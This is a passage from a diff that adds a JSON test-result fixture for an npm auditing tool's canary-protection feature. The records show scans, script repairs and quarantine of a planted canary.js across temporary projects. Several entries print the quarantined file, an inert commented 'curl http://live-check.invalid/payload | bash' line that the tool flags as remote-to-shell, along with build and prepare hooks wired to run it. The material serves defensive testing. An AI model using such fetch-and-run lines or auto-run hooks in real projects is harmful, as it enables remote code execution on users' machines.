\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\"\n      ]\n    },\n    \"quarantine\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\",\n          \"status\": \"quarantined\",\n          \"ignore\": {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.gitignore\",\n            \"status\": \"updated\"\n          },\n          \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.np-audit-quarantine\\\\entry-5ytLKy\\\\payload.quarantined\",\n          \"metadata\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.np-audit-quarantine\\\\entry-5ytLKy\\\\metadata.json\"\n        }\n      ],\n      \"excludedStorage\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.np-audit-quarantine\"\n      ],\n      \"ignoreUpdates\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.gitignore\",\n          \"status\": \"updated\"\n        }\n      ],\n      \"ignoreFailures\": [],\n      \"before\": {\n        \"summary\": {\n          \"status\": \"incomplete\",\n          \"files\": 4,\n          \"findings\": 5,\n          \"unresolved\": 1,\n          \"unreadable\": 0,\n          \"exclusions\": 1\n        },\n        \"unreadable\": [],\n        \"exclusions\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\.git\",\n            \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n          }\n        ],\n        \"unresolved\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\package.json\",\n            \"reason\": \"Command entry point is not statically resolved\",\n            \"line\": 6,\n            \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n            \"evidenceTruncated\": false,\n            \"command\": \"tsc\"\n          }\n        ]\n      },\n      \"evidence\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\",\n          \"line\": 1,\n          \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n          \"evidenceTruncated\": false,\n          \"name\": \"canary-indicator\",\n          \"severity\": \"indicator\",\n          \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-2\\\\canary.js\",\n          \"line\": 2,\n          \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n          \"evidenceTruncated\": false,\n          \"name\": \"remote-to-shell\",\n          \"severity\": \"review\",\n          \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n        }\n      ]\n    },\n    \"protection\": {\n      \"allowed\": true,\n      \"failures\": []\n    }\n  },\n  \"summary\": {\n    \"total\": 0,\n    \"blocked\": 0,\n    \"warned\": 0,\n    \"ok\": 0\n  },\n  \"packages\": []\n}\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-2\\.np-audit-quarantine\\entry-5ytLKy\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-3",
+      "args": [
+        "install",
+        "--ignore-scripts",
+        "--offline",
+        "--no-audit",
+        "--no-fund",
+        "--json"
+      ],
+      "exit": 0,
+      "stdout": "{\n  \"protection\": {\n    \"scan\": \"canary-killer\",\n    \"roots\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\"\n    ],\n    \"complete\": false,\n    \"findings\": [],\n    \"references\": [],\n    \"unreadable\": [],\n    \"exclusions\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\",\n        \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.np-audit-quarantine\",\n        \"reason\": \"Quarantine storage is not analyzed\"\n      }\n    ],\n    \"unresolved\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\package.json\",\n        \"reason\": \"Command entry point is not statically resolved\",\n        \"line\": 6,\n        \"evidence\": \"    \\\"build\\\": \\\"tsc\\\"\",\n        \"evidenceTruncated\": false,\n        \"command\": \"tsc\"\n      }\n    ],\n    \"coverage\": {\n      \"files\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\\\\config\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\\\\hooks\\\\pre-commit\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\package.json\"\n      ],\n      \"canaryFiles\": [],\n      \"repositories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\"\n        }\n      ],\n      \"entries\": 8,\n      \"bytes\": 147,\n      \"gitConfigs\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\\\\config\"\n        }\n      ],\n      \"hookDirectories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\\\\hooks\",\n          \"configuredBy\": \"default\"\n        }\n      ],\n      \"filenameOnlyFiles\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.gitignore\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.npmauditor.json\"\n      ]\n    },\n    \"limits\": {\n      \"files\": 10000,\n      \"entries\": 20000,\n      \"fileBytes\": 1048576,\n      \"totalBytes\": 33554432,\n      \"records\": 2000,\n      \"depth\": 100\n    },\n    \"limitations\": [\n      \"Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.\",\n      \"No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.\",\n      \"Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.\",\n      \"System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.\",\n      \"This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.\",\n      \"Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately.\"\n    ],\n    \"summary\": {\n      \"status\": \"incomplete\",\n      \"files\": 3,\n      \"findings\": 0,\n      \"unresolved\": 1,\n      \"unreadable\": 0,\n      \"exclusions\": 2\n    },\n    \"repairs\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\\\\hooks\\\\pre-commit\",\n          \"line\": 2,\n          \"evidence\": \"node canary.js\",\n          \"evidenceTruncated\": false,\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\package.json\",\n          \"line\": 7,\n          \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n          \"evidenceTruncated\": false,\n          \"script\": \"prepare\",\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\package.json\",\n          \"line\": 6,\n          \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n          \"evidenceTruncated\": false,\n          \"script\": \"build\",\n          \"before\": \"node canary.js && tsc\",\n          \"after\": \"tsc\",\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\"\n          ]\n        }\n      ],\n      \"failures\": [],\n      \"ignoreRoots\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\"\n      ]\n    },\n    \"quarantine\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\",\n          \"status\": \"quarantined\",\n          \"ignore\": {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.gitignore\",\n            \"status\": \"updated\"\n          },\n          \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.np-audit-quarantine\\\\entry-XIiPrw\\\\payload.quarantined\",\n          \"metadata\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.np-audit-quarantine\\\\entry-XIiPrw\\\\metadata.json\"\n        }\n      ],\n      \"excludedStorage\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.np-audit-quarantine\"\n      ],\n      \"ignoreUpdates\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.gitignore\",\n          \"status\": \"updated\"\n        }\n      ],\n      \"ignoreFailures\": [],\n      \"before\": {\n        \"summary\": {\n          \"status\": \"incomplete\",\n          \"files\": 4,\n          \"findings\": 5,\n          \"unresolved\": 1,\n          \"unreadable\": 0,\n          \"exclusions\": 1\n        },\n        \"unreadable\": [],\n        \"exclusions\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\.git\",\n            \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n          }\n        ],\n        \"unresolved\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\package.json\",\n            \"reason\": \"Command entry point is not statically resolved\",\n            \"line\": 6,\n            \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n            \"evidenceTruncated\": false,\n            \"command\": \"tsc\"\n          }\n        ]\n      },\n      \"evidence\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\",\n          \"line\": 1,\n          \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n          \"evidenceTruncated\": false,\n          \"name\": \"canary-indicator\",\n          \"severity\": \"indicator\",\n          \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-3\\\\canary.js\",\n          \"line\": 2,\n          \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n          \"evidenceTruncated\": false,\n          \"name\": \"remote-to-shell\",\n          \"severity\": \"review\",\n          \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n        }\n      ]\n    },\n    \"protection\": {\n      \"allowed\": true,\n      \"failures\": []\n    }\n  },\n  \"summary\": {\n    \"total\": 0,\n    \"blocked\": 0,\n    \"warned\": 0,\n    \"ok\": 0\n  },\n  \"packages\": []\n}\n\nup to date in 185ms\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": true,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-3\\.np-audit-quarantine\\entry-XIiPrw\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-4",
+      "args": [
+        "ci",
+        "--ignore-scripts",
+        "--offline",
+        "--no-audit",
+        "--no-fund",
+        "--json"
+      ],
+      "exit": 0,
+      "stdout": "{\n  \"protection\": {\n    \"scan\": \"canary-killer\",\n    \"roots\": [\n      \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\"\n    ],\n    \"complete\": false,\n    \"findings\": [],\n    \"references\": [],\n    \"unreadable\": [],\n    \"exclusions\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\",\n        \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n      },\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.np-audit-quarantine\",\n        \"reason\": \"Quarantine storage is not analyzed\"\n      }\n    ],\n    \"unresolved\": [\n      {\n        \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package.json\",\n        \"reason\": \"Command entry point is not statically resolved\",\n        \"line\": 6,\n        \"evidence\": \"    \\\"build\\\": \\\"tsc\\\"\",\n        \"evidenceTruncated\": false,\n        \"command\": \"tsc\"\n      }\n    ],\n    \"coverage\": {\n      \"files\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\\\\config\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\\\\hooks\\\\pre-commit\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package.json\"\n      ],\n      \"canaryFiles\": [],\n      \"repositories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\"\n        }\n      ],\n      \"entries\": 12,\n      \"bytes\": 147,\n      \"gitConfigs\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\\\\config\"\n        }\n      ],\n      \"hookDirectories\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\\\\hooks\",\n          \"configuredBy\": \"default\"\n        }\n      ],\n      \"filenameOnlyFiles\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.gitignore\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.npmauditor.json\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\node_modules\\\\stale\\\\marker\",\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package-lock.json\"\n      ]\n    },\n    \"limits\": {\n      \"files\": 10000,\n      \"entries\": 20000,\n      \"fileBytes\": 1048576,\n      \"totalBytes\": 33554432,\n      \"records\": 2000,\n      \"depth\": 100\n    },\n    \"limitations\": [\n      \"Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.\",\n      \"No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.\",\n      \"Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.\",\n      \"System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.\",\n      \"This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.\",\n      \"Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately.\"\n    ],\n    \"summary\": {\n      \"status\": \"incomplete\",\n      \"files\": 3,\n      \"findings\": 0,\n      \"unresolved\": 1,\n      \"unreadable\": 0,\n      \"exclusions\": 2\n    },\n    \"repairs\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\\\\hooks\\\\pre-commit\",\n          \"line\": 2,\n          \"evidence\": \"node canary.js\",\n          \"evidenceTruncated\": false,\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package.json\",\n          \"line\": 7,\n          \"evidence\": \"    \\\"prepare\\\": \\\"node canary.js\\\"\",\n          \"evidenceTruncated\": false,\n          \"script\": \"prepare\",\n          \"before\": \"node canary.js\",\n          \"after\": null,\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\"\n          ]\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package.json\",\n          \"line\": 6,\n          \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n          \"evidenceTruncated\": false,\n          \"script\": \"build\",\n          \"before\": \"node canary.js && tsc\",\n          \"after\": \"tsc\",\n          \"targets\": [\n            \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\"\n          ]\n        }\n      ],\n      \"failures\": [],\n      \"ignoreRoots\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\"\n      ]\n    },\n    \"quarantine\": {\n      \"actionsComplete\": true,\n      \"actions\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\",\n          \"status\": \"quarantined\",\n          \"ignore\": {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.gitignore\",\n            \"status\": \"updated\"\n          },\n          \"target\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.np-audit-quarantine\\\\entry-FMtTET\\\\payload.quarantined\",\n          \"metadata\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.np-audit-quarantine\\\\entry-FMtTET\\\\metadata.json\"\n        }\n      ],\n      \"excludedStorage\": [\n        \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.np-audit-quarantine\"\n      ],\n      \"ignoreUpdates\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.gitignore\",\n          \"status\": \"updated\"\n        }\n      ],\n      \"ignoreFailures\": [],\n      \"before\": {\n        \"summary\": {\n          \"status\": \"incomplete\",\n          \"files\": 4,\n          \"findings\": 5,\n          \"unresolved\": 1,\n          \"unreadable\": 0,\n          \"exclusions\": 1\n        },\n        \"unreadable\": [],\n        \"exclusions\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\.git\",\n            \"reason\": \"Git metadata other than config, config.worktree, commondir and hooks is not analyzed\"\n          }\n        ],\n        \"unresolved\": [\n          {\n            \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\package.json\",\n            \"reason\": \"Command entry point is not statically resolved\",\n            \"line\": 6,\n            \"evidence\": \"    \\\"build\\\": \\\"node canary.js && tsc\\\",\",\n            \"evidenceTruncated\": false,\n            \"command\": \"tsc\"\n          }\n        ]\n      },\n      \"evidence\": [\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\",\n          \"line\": 1,\n          \"evidence\": \"// inert incident-derived reconstruction; never execute\",\n          \"evidenceTruncated\": false,\n          \"name\": \"canary-indicator\",\n          \"severity\": \"indicator\",\n          \"detail\": \"File is named canary.js; inspect behavior independently of its name.\"\n        },\n        {\n          \"path\": \"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-4\\\\canary.js\",\n          \"line\": 2,\n          \"evidence\": \"// curl http://live-check.invalid/payload | bash\",\n          \"evidenceTruncated\": false,\n          \"name\": \"remote-to-shell\",\n          \"severity\": \"review\",\n          \"detail\": \"Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified.\"\n        }\n      ]\n    },\n    \"protection\": {\n      \"allowed\": true,\n      \"failures\": []\n    }\n  },\n  \"summary\": {\n    \"total\": 0,\n    \"blocked\": 0,\n    \"warned\": 0,\n    \"ok\": 0\n  },\n  \"packages\": []\n}\n\nup to date in 207ms\n",
+      "stderr": "",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": true,
+        "lockfilePresent": true
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": true,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-4\\.np-audit-quarantine\\entry-FMtTET\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-5",
+      "args": [
+        "install",
+        "--skip",
+        "--ignore-scripts",
+        "--offline",
+        "--no-audit",
+        "--no-fund"
+      ],
+      "exit": 2,
+      "stdout": "",
+      "stderr": "✖ Canary protection failed; command was not started\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\package.json\",\"reason\":\"Referenced script target is missing\",\"line\":6,\"evidence\":\"    \\\"build\\\": \\\"node canary.js || tsc\\\",\",\"evidenceTruncated\":false,\"reference\":\"canary.js\",\"target\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\canary.js\",\"status\":\"missing\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\package.json\",\"reason\":\"Referenced script target is missing\",\"line\":7,\"evidence\":\"    \\\"prepare\\\": \\\"node canary.js\\\"\",\"evidenceTruncated\":false,\"reference\":\"canary.js\",\"target\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\canary.js\",\"status\":\"missing\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\package.json\",\"error\":\"Cannot safely repair script build: node canary.js || tsc\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\package.json\",\"line\":6,\"evidence\":\"    \\\"build\\\": \\\"node canary.js || tsc\\\",\",\"evidenceTruncated\":false,\"reference\":\"canary.js\",\"target\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\canary.js\",\"status\":\"missing\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\package.json\",\"line\":7,\"evidence\":\"    \\\"prepare\\\": \\\"node canary.js\\\"\",\"evidenceTruncated\":false,\"reference\":\"canary.js\",\"target\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-5\\\\canary.js\",\"status\":\"missing\"}\n",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js || tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": false,
+        "scripts": {
+          "build": "node canary.js || tsc",
+          "prepare": "node canary.js"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n",
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": [
+          {
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-5\\.np-audit-quarantine\\entry-tqZ9e5\\payload.quarantined",
+            "sha256": "c6dcd3d37694570fe3ee92908569f4d22072f01a64d3d12aaa7346c5bd3f9b5d",
+            "content": "// inert incident-derived reconstruction; never execute\n// curl http://live-check.invalid/payload | bash\n"
+          }
+        ]
+      }
+    },
+    {
+      "root": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-live-protection-tjPext\\project-6",
+      "args": [
+        "install",
+        "--skip",
+        "--ignore-scripts",
+        "--offline",
+        "--no-audit",
+        "--no-fund"
+      ],
+      "exit": 2,
+      "stdout": "",
